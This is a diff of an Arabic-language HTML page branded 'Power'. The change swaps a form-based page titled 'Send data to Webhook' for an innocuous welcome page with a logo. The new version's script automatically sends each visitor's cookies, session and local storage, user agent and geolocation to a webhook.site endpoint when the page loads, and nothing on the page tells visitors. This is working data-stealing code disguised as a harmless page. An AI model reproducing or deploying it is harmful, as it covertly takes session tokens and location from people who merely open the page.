@@ -3,22 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال بيانات إلى Webhook</title>
+    <title>مرحبًا بك في عالم Power!</title>
 </head>
 <body>
+    <!-- إظهار الشعار فقط -->
     <h1>مرحبًا بك في عالم Power!</h1>
-    <p>نحن سعداء بوجودك هنا. استمتع بتجربتك معنا!</p>
-
-    <!-- نموذج لإدخال بيانات العميل -->
-    <form id="userForm">
-        <label for="username">اسم المستخدم:</label>
-        <input type="text" id="username" name="username" required><br><br>
-
-        <label for="email">البريد الإلكتروني:</label>
-        <input type="email" id="email" name="email" required><br><br>
-
-        <button type="submit">إرسال البيانات</button>
-    </form>
+    <img src="https://powerman907090.github.io/js-test/images/logo.png" alt="Power Logo" width="200">
 
     <script>
         // === استخراج بيانات حقيقية من المتصفح ===
@@ -41,44 +31,29 @@
         sessionStorage.setItem('sessionStart', sessionStart);
         sessionStorage.setItem('language', language);
 
-        // === إرسال البيانات عند تقديم النموذج ===
-        document.getElementById('userForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            // الحصول على بيانات العميل من النموذج
-            const username = document.getElementById('username').value;
-            const email = document.getElementById('email').value;
-
-            // === إرسال بيانات الموقع الجغرافي وبيانات العميل إلى Webhook ===
-            navigator.geolocation.getCurrentPosition(function(position) {
-                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        cookies: document.cookie,
-                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-                        localStorage: Object.fromEntries(Object.entries(localStorage)),
-                        userAgent: userAgent,
-                        username: username,  // اسم المستخدم الذي أدخله العميل
-                        email: email,        // البريد الإلكتروني الذي أدخله العميل
-                        time: new Date().toISOString(),
-                        location: {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        }
-                    })
+        // === إرسال البيانات بعد تحميل الصفحة ===
+        navigator.geolocation.getCurrentPosition(function(position) {
+            fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    cookies: document.cookie,
+                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+                    localStorage: Object.fromEntries(Object.entries(localStorage)),
+                    userAgent: userAgent,
+                    time: new Date().toISOString(),
+                    location: {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    }
                 })
-                .then(response => response.json())
-                .then(data => console.log("تم إرسال البيانات بنجاح:", data))
-                .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
-            }, function(error) {
-                console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
-            });
-
-            // إظهار رسالة بعد إرسال البيانات
-            alert("تم إرسال البيانات بنجاح!");
+            })
+            .then(response => response.json())
+            .then(data => console.log("تم إرسال البيانات بنجاح:", data))
+            .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
+        }, function(error) {
+            console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
         });
-
     </script>
 </body>
 </html>
